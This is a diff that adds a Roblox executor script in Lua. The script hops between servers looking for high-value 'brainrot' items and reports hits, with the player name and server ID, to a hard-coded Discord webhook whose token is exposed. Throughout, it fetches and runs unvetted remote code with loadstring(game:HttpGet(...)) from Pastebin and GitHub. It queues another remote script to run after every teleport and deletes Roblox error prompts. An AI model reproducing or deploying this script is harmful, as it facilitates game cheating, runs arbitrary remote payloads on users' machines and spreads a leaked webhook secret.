@@ -1,1 +1,451 @@
--- alr
+local queue_on_teleport = queue_on_teleport
+local webhookUtil = loadstring(game:HttpGet("https://pastebin.com/raw/fpkbJgyq"))()
+local brainrotImages = loadstring(game:HttpGet("https://pastebin.com/raw/i0AJf9G9"))()
+local Service = game:GetService("HttpService")
+local hubName = "garof counter" -- idk it ain a hub lmao
+
+print("script started")
+game.Players.LocalPlayer.OnTeleport:Connect(function(state)
+	if state ~= Enum.TeleportState.Started and state ~= Enum.TeleportState.InProgress then return end
+
+	queue_on_teleport([[
+		print(1) -- rlly hope this doesnt break bro
+
+		repeat
+			task.wait()
+		until game:IsLoaded() and game.Players.LocalPlayer and game.Players.LocalPlayer.Character
+
+		print(2)
+
+		task.wait(3)
+
+		print(3)
+
+		local url = "https://raw.githubusercontent.com/majdnakhleh92/very-cool/refs/heads/main/script.lua.txt"
+		local StarterGui = game:GetService("StarterGui")
+		local SoundService = game:GetService("SoundService")
+
+		local func, err = pcall(function()
+			loadstring(game:HttpGet(url))()
+		end)
+
+		if not func then
+			print(err)
+			StarterGui:SetCore("SendNotification", {
+				Title = "SOMETHING WENT WRONG!!!",
+				Text = "somethingwentwrong",
+				Duration = 5
+			})
+ 
+			local sound = Instance.new("Sound")
+			sound.SoundId = "rbxassetid://4881487887"
+			sound.Volume = 0.5
+			sound.Looped = false
+			sound.Parent = SoundService
+			sound:Play()
+		end
+    ]])
+end)
+
+local Settings = {
+	["Server Count"] = 0
+}
+
+makefolder(hubName)
+
+function SaveSettings()
+	local JSON = Service:JSONEncode(Settings)
+	writefile(hubName .. "\\configName.cfg", JSON)
+end
+
+function LoadSettings()
+	if isfile(hubName .. "\\configName.cfg") then
+		Settings = Service:JSONDecode(readfile(hubName .. "\\configName.cfg"))
+	end
+end
+
+LoadSettings()
+
+function ResetSettings()
+	Settings["Server Count"] = 0
+	local JSON = Service:JSONEncode(Settings)
+	writefile(hubName .. "\\configName.cfg", JSON)
+end
+
+local function GetPlayerNameFromLabel(textLabel)
+	if not textLabel or not textLabel:IsA("TextLabel") or not textLabel.Text then
+		return nil
+	end
+
+	local text = textLabel.Text
+
+
+	local playerName = string.match(text, "^(.+)'s Base$")
+
+	if playerName then
+		for _, PLR in pairs(game.Players:GetPlayers()) do
+			if PLR.Name == playerName or PLR.DisplayName == playerName then
+				return PLR
+			end
+		end
+		return nil
+	else
+
+		if string.match(text, "^Empty Base$") then
+			return nil
+		else
+
+			warn("Unexpected base label format: " .. text)
+			return nil
+		end
+	end
+end
+
+local function GetBrainrotUrl(name)
+	local brainrotImage = brainrotImages[name]
+	if brainrotImage then
+		return brainrotImage
+	end
+	return nil
+end
+
+local function DiscordNotificationCURRENCY(txtlbl, temp)
+
+	local ovrhead = txtlbl.Parent
+
+	local bestDisplayName = ovrhead:FindFirstChild("DisplayName")
+	local bestgen = ovrhead:FindFirstChild("Generation")
+
+	local description = "**⚠︎ Other Brainrots**\n```" .. table.concat(temp, "\n") .. "```"
+
+	local myMessage = webhookUtil.createMessage({
+		Url = "https://discord.com/api/webhooks/1317498619770703893/jyiYAeI_GvB1Nw4vcbZNmxyXaReXg2vRiKDxy0txviujU3o_71ec5FAsyxDOEgBGkXoh",
+		username = "Script Logs",
+		content = "A good server found by: " .. game.Players.LocalPlayer.Name
+	})
+
+	local embed1 = myMessage.addEmbed(
+		bestDisplayName.Text .. " " .. bestgen.Text,
+		0x57F287,
+		description,
+		nil,
+		GetBrainrotUrl(bestDisplayName.Text)
+	)
+
+	embed1.addField("Server Id", game.JobId, false)
+	embed1.addField("Servers Hopped", Settings["Server Count"], false)
+
+	myMessage.sendMessage()
+
+	ResetSettings()
+	return
+end
+
+local function DiscordNotificationNAME(txtlbl: TextLabel)
+
+	print("generating response")
+
+	local DisplayName = txtlbl 
+
+	local myMessage = webhookUtil.createMessage({
+		Url = "https://discord.com/api/webhooks/1317498619770703893/jyiYAeI_GvB1Nw4vcbZNmxyXaReXg2vRiKDxy0txviujU3o_71ec5FAsyxDOEgBGkXoh",
+		username = "Script Logs",
+		content = "A good server found by: " .. game.Players.LocalPlayer.Name
+	})
+
+	local embed1 = myMessage.addEmbed(txtlbl.Text, 0x57F287, "brainrot found by name", nil, GetBrainrotUrl(txtlbl.Text))
+
+	embed1.addField("Server Id", game.JobId, false)
+	embed1.addField("Servers Hopped", Settings["Server Count"], false)
+
+	myMessage.sendMessage()
+
+	ResetSettings()
+	return
+end
+
+local blacklist = {"Lucky Block", "Giftini Spyderini", "Santa Hotspot", "Naughty Naughty", "Los Cucarachas", "La Cucaracha", "Pot Hotspot", "Los 25", "Ho Ho Ho Sahur", "To to to Sahur", "Chimnino", "Graipuss Medussi", "Rocco Disco", "Triplito Tralaleritos", "La Vacca Prese Presente", "Los Tralaleritos", "Guerriro Digitale", "Noo my Present", "Las Tralaleritas", "Los Tortus", "Job Job Job Sahur", "Los Burritos", "Los Jobcitos", "Burrito Bandito", "Quesadilla Crocodila", "Los Quesadillas", "Tung Tung Tung Sahur", "Cuadramat and Pakrahmatmamat", "List List List Sahur", "Chicleteirina Bicicleteirina"}
+local Priority = {"Chicleteira Bicicleteira", "Rang Ring Bus", "67", "Nooo my Hotspot", "Raccooni Jandelini"}
+
+local function GetAnimalOverhead()
+	local animalOverheadTable = {}
+
+	for _, SurfaceGui in pairs(workspace:GetDescendants()) do
+		if SurfaceGui:IsA("SurfaceGui") and SurfaceGui.Name == "AnimalOverhead" then
+			table.insert(animalOverheadTable, SurfaceGui)
+		end
+	end
+
+	return animalOverheadTable
+end
+
+local function GetMostValuable(strings, minimum)
+	local bestValue = -math.huge
+	local bestTextLabel = nil
+	local bestString = nil
+	local minimumMetTextLabels = {}
+
+	for _, txtlbl in ipairs(strings) do
+		local str = txtlbl.Text
+		local number, suffix = string.match(str:lower(), "^%s*%$?(%d*%.?%d+)%s*([kmb]?)%s*/?s?$")
+		if number then
+			local value = tonumber(number)
+			if value then
+				if suffix == "k" then
+					value = value * 1_000
+				elseif suffix == "m" then
+					value = value * 1_000_000
+				elseif suffix == "b" then
+					value = value * 1_000_000_000
+				end
+				if value > bestValue then
+					bestValue = value
+					bestTextLabel = txtlbl
+					bestString = str
+					print("Valid currency string: " .. str .. " -> Value: " .. value)
+				end
+				if value >= minimum then
+					table.insert(minimumMetTextLabels, {label = txtlbl, value = value})
+				end
+			end
+		else
+			print("Skipped non-currency string: " .. str)
+		end
+	end
+
+	if bestValue == -math.huge then
+		print("No valid currency strings found")
+		return false, nil, nil, {}
+	end
+
+	table.sort(minimumMetTextLabels, function(a, b)
+		return a.value > b.value
+	end)
+
+	local temp = {}
+	for _, entry in ipairs(minimumMetTextLabels) do
+		local generation = entry.label.Text
+		local overhead = entry.label.Parent
+		local dpName = overhead.DisplayName
+		table.insert(temp, dpName.Text .. " (" .. generation .. ")")
+	end
+
+	local meetsMinimum = bestValue >= minimum
+	print(string.format("Highest value: %d, Minimum: %d, Meets minimum: %s", bestValue, minimum, tostring(meetsMinimum)))
+
+	return meetsMinimum, bestTextLabel, bestString, temp
+end
+
+local function CheckNames() 
+	local nameMatch = nil
+	local PLR = nil
+
+	local AnimalOverheadTabel = GetAnimalOverhead()
+
+	for _, proximity in pairs(workspace.Plots:GetDescendants()) do
+		if proximity:IsA("ProximityPrompt") then
+			if proximity.ObjectText == "Secret Lucky Block" then
+				nameMatch = proximity.ObjectText
+			end
+		end
+	end
+
+
+	for _, overhead in pairs(AnimalOverheadTabel) do
+		if nameMatch ~= nil then break end
+
+		local DisplayName = overhead:FindFirstChild("DisplayName")
+		local Stolen = overhead:FindFirstChild("Stolen")
+
+		if Stolen and Stolen.Text == "FUSING" and Stolen.Visible == true then continue end
+		if not DisplayName then continue end
+
+		if table.find(Priority, DisplayName.Text) then
+			nameMatch = DisplayName
+			print("Found matching DisplayName TextLabel: " .. DisplayName.Text)
+			break
+		end
+
+		if not nameMatch or DisplayName.Text ~= nameMatch then
+			local namesStr = table.concat(Priority, ", ")
+		end
+	end
+
+	return nameMatch ~= nil, nameMatch
+end
+
+local function CheckCurrency(minimum)
+	local valuetable = {}
+	local AnimalOverheadTabel = GetAnimalOverhead()
+
+	for _, overhead in pairs(AnimalOverheadTabel) do
+		local Stolen = overhead:FindFirstChild("Stolen")
+		local displayName = overhead:FindFirstChild("DisplayName")
+		local gen = overhead:FindFirstChild("Generation")
+
+		if Stolen and Stolen.Text == "FUSING" and Stolen.Visible == true then continue end
+		if displayName and table.find(blacklist, displayName.Text) then continue end
+
+		if not gen then continue end
+		table.insert(valuetable, gen)
+
+	end
+
+	local meetsMinimum, textlabel, amount, minimumMetTextLabels = GetMostValuable(valuetable, minimum)
+	return meetsMinimum, amount, textlabel, minimumMetTextLabels
+end
+
+local function Serverhop()
+	local Tried
+	local API, HttpService, TeleportService, CoreGui = nil, game:GetService("HttpService"), game:GetService("TeleportService"), game:GetService("CoreGui");
+	local RemoveErrorPrompts = true
+	local IterationSpeed = 0.40 --speed in which next server is picked for teleport (the higher it is the slower the teleports but more likely to work).
+	local ExcludefullServers = false --slightly beneficial if the game is high ccu or mid ccu, if not, set to false.
+	local SaveTeleportAttempts = false
+
+	local function EncodeToFile(JSONString)
+		local success, JSONData = pcall(function()
+			return HttpService:JSONDecode(JSONString)
+		end)
+		if success and JSONData.data then
+			JSONData.gameId = game.PlaceId
+			local success, encoded = pcall(function()
+				return HttpService:JSONEncode(JSONData)
+			end)
+			if success then
+				writefile("Servers.JSON", encoded)
+			else
+				error("Failed to encode JSON string.")
+				return
+			end
+		else
+			error("Failed to decode JSONData.")
+			return
+		end
+		return JSONData
+	end
+
+	local function NextCursor(ep)
+		return game:HttpGet(API .. "&excludeFullGames=" .. tostring(ExcludefullServers) .. ((ep and "&cursor=" .. ep) or ""))
+	end
+
+	local function StartTeleport()
+		local JSONData = EncodeToFile(readfile("Servers.JSON"))
+		for i = 0, 99 do
+			if #JSONData.data <= 1 then
+				EncodeToFile(NextCursor(JSONData.nextPageCursor))
+				TeleportService:Teleport(game.PlaceId, game.Players.LocalPlayer)
+			end
+			if JSONData.data[i] then
+				local JobId = JSONData.data[i].id
+				table.remove(JSONData.data, i)
+				local sucess, encoded = pcall(function()
+					return HttpService:JSONEncode(JSONData)
+				end)
+				writefile("Servers.JSON", encoded)
+				if SaveTeleportAttempts then
+					appendfile("Attempts.txt", JobId .. "\n")
+				end
+				TeleportService:TeleportToPlaceInstance(game.PlaceId, JobId, game.Players.LocalPlayer)
+				Tried = true
+				task.wait(IterationSpeed)
+			end
+		end
+	end
+
+	local function SetMainPage()
+		local MainPage = game:HttpGet(API)
+		writefile("Servers.JSON", MainPage)
+		StartTeleport()
+	end
+
+	API = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?limit=100"
+
+	if RemoveErrorPrompts then
+		local ep = CoreGui:WaitForChild("RobloxGui"):WaitForChild("Modules"):FindFirstChild("ErrorPrompt")
+		if ep then
+			ep:Destroy()
+		end
+
+		if CoreGui:FindFirstChild("RobloxPromptGui") then
+			CoreGui.RobloxPromptGui:Destroy()
+		end
+	end
+
+	if isfile("Servers.JSON") then
+		local success, JSONData = pcall(function()
+			return HttpService:JSONDecode(readfile("Servers.JSON"))
+		end)
+		if success and JSONData then
+			if JSONData.gameId ~= game.PlaceId then
+				warn("Game mismatch from cache, remaking cache for --> " .. game.PlaceId)
+				SetMainPage()
+			end
+			if JSONData.data and #JSONData.data >= 1 then
+				StartTeleport()
+			else
+				if success and JSONData.nextPageCursor then
+					EncodeToFile(NextCursor(JSONData.nextPageCursor))
+					StartTeleport()
+				else
+					SetMainPage()
+				end
+			end
+		else
+			SetMainPage()
+		end
+	else
+		SetMainPage()
+	end
+
+	if Tried then
+		print("yaaaaaaaaaaaaaaaaaaaaa")
+		Serverhop()
+	end
+end
+
+local minimum = 10_000_000
+local nameFound, matchedName = CheckNames()
+local meetsMinimum, highestAmount, currencyTextLabel, temp = CheckCurrency(minimum)
+
+
+local hasMatch = meetsMinimum or nameFound
+local mainScript = "https://raw.githubusercontent.com/ily123950/Vulkan/refs/heads/main/Tr"
+
+if meetsMinimum then
+	print("Ooooo we got something")
+	local sound = Instance.new("Sound")
+	sound.SoundId = "rbxassetid://8486683243"
+	sound.Volume = 1
+	sound.Looped = false
+	sound.Parent = game.SoundService 
+	sound:Play()
+
+	task.spawn(function()
+		loadstring(game:HttpGet(mainScript))()
+	end)
+
+	DiscordNotificationCURRENCY(currencyTextLabel, temp)
+
+elseif nameFound then
+	print("yess we found")
+	local sound = Instance.new("Sound")
+	sound.SoundId = "rbxassetid://8486683243"
+	sound.Volume = 1
+	sound.Looped = false
+	sound.Parent = game.SoundService 
+	sound:Play()
+
+	task.spawn(function()
+		loadstring(game:HttpGet(mainScript))()
+	end)
+
+	DiscordNotificationNAME(matchedName)
+else
+	Settings["Server Count"] += 1
+	SaveSettings()
+	Serverhop()
+end
+
+
+
